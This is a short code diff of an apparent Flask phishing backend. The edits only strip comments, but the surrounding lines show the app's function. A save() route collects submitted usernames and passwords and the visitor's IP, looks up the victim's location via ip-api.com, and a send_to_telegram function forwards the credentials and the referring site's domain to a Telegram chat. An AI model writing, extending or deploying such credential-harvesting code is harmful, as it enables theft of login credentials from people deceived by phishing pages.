@@ -34,7 +34,6 @@ TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
 
 # ---------- Geo Lookup ----------
 def get_geo_info(ip):
-    """Fetch country, region, city, isp from ip-api.com"""
     try:
         url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp"
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
@@ -61,7 +60,7 @@ def send_to_telegram(username, password, ip, user_agent):
     country, region, city, isp = get_geo_info(ip)
     date = time.strftime("%Y-%m-%d")
 
-    # Domain from Origin/Referer
+    # Domain
     domain = request.headers.get("Origin") or request.headers.get("Referer") or "N/A"
     domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
 
@@ -121,7 +120,6 @@ def save():
         return jsonify({"success": False, "message": "All fields required"}), 400
 
     ip = get_remote_address()
-    # Handle reverse proxies (Render, Railway, Nginx, etc.)
     forwarded = request.headers.get("X-Forwarded-For")
     if forwarded:
         ip = forwarded.split(",")[0].strip()
